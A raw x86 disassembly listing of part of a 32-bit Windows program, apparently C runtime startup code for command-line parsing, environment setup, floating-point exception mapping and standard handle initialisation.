  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
